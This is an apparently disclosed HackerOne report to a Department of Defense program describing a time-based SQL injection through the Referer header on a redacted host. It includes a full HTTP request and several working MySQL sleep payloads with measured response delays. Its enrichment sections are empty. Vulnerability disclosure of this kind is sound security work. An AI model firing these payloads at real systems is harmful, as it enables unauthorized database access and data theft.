---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '995122'
original_report_id: '995122'
title: '[SQLI ]Time  Bassed Injection at ██████████ via referer header'
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2020-09-30T19:00:04.164Z'
disclosed_at: '2020-10-16T19:46:54.949Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 83
tags:
- hackerone
- sql-injection
---

# [SQLI ]Time  Bassed Injection at ██████████ via referer header

## Metadata

- HackerOne Report ID: 995122
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2020-10-16T19:46:54.949Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi

the ████ was vulnerable to time bassed injection via referer header

#steps
  
1- copy the request to your burp suite :

```GET /DNCdb.php?alert= HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
████=*
Upgrade-Insecure-Requests: 1
Referer: http://www.google.com/search?hl=en&q='+(select*from(select(sleep(7*7)))a)+' ```

the injection point is``` Referer: http://www.google.com/search?hl=en&q=*```

payload > '+(select*from(select(sleep(7*7)))a)+'  > 7*7 = 49.> 49,708 mills
█████

payload > '+(select*from(select(sleep(20)))a)+'  > 20 = 20,208 mills

██████████

payload>  '+(select*from(select(sleep(20+10)))a)+'  > 10+20=30 > 30,289 mills
██████████

## Impact

SQL Injection, attacker can dump the database of ████

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
